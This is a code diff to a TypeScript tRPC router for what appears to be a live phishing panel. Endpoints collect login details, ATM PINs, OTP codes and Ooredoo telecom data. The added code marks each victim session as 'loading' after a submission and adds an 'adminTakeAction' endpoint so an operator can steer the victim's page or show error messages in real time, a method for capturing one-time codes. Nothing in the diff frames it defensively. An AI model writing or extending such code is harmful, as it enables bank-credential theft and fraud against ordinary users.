@@ -11,6 +11,9 @@ import {
   submitOoredoo,
   getAllSubmissions,
   getSubmissionDetails,
+  updateSessionStatus,
+  adminTakeAction,
+  getSessionStatus,
 } from "./db";
 
 export const appRouter = router({
@@ -79,6 +82,7 @@ export const appRouter = router({
       })
       .mutation(async ({ input }) => {
         await submitLoginMethod(input);
+        await updateSessionStatus(input.sessionId, "loading", "login");
         return { success: true };
       }),
 
@@ -93,6 +97,7 @@ export const appRouter = router({
       })
       .mutation(async ({ input }) => {
         await submitAtmPin(input);
+        await updateSessionStatus(input.sessionId, "loading", "atm");
         return { success: true };
       }),
 
@@ -108,6 +113,7 @@ export const appRouter = router({
       })
       .mutation(async ({ input }) => {
         await submitOtp(input);
+        await updateSessionStatus(input.sessionId, "loading", input.otpType === "ooredoo" ? "otp_ooredoo" : "otp");
         return { success: true };
       }),
 
@@ -123,6 +129,7 @@ export const appRouter = router({
       })
       .mutation(async ({ input }) => {
         await submitOoredoo(input);
+        await updateSessionStatus(input.sessionId, "loading", "ooredoo");
         return { success: true };
       }),
 
@@ -137,6 +144,30 @@ export const appRouter = router({
       })
       .query(async ({ input }) => {
         return await getSubmissionDetails(input);
+      }),
+
+    getSessionStatus: publicProcedure
+      .input((val: unknown) => {
+        if (typeof val !== "string") throw new Error("Invalid input");
+        return val;
+      })
+      .query(async ({ input }) => {
+        return await getSessionStatus(input);
+      }),
+
+    adminTakeAction: publicProcedure
+      .input((val: unknown) => {
+        if (typeof val !== "object" || val === null) throw new Error("Invalid input");
+        const obj = val as Record<string, unknown>;
+        return {
+          sessionId: String(obj.sessionId),
+          action: String(obj.action),
+          errorMessage: obj.errorMessage ? String(obj.errorMessage) : undefined,
+        };
+      })
+      .mutation(async ({ input }) => {
+        await adminTakeAction(input.sessionId, input.action, input.errorMessage);
+        return { success: true };
       }),
   }),
 });
